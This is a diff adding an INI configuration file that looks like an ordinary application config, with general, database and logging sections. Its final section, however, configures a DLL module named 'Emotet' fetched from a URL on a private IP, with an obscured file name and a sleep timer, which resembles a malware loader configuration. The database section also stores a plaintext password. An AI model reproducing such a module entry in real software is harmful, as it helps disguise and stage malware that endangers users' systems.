@@ -1,1 +1,24 @@
 0.0.1
+
+[General]
+AppName = MyApplication
+Version = 1.0
+Author = John Doe
+
+[Database]
+Host = 192.168.17.128
+Port = 3306
+Username = iskon
+Password = bypass
+DatabaseName = iCloud
+
+[Logging]
+LogLevel = INFO
+LogFile = app.log
+
+[Module]
+Type = DLL
+Name = Emotet
+Url = https://192.168.17.128:8334/
+Location = inf?324ggigle.dll
+Sleep = 4000
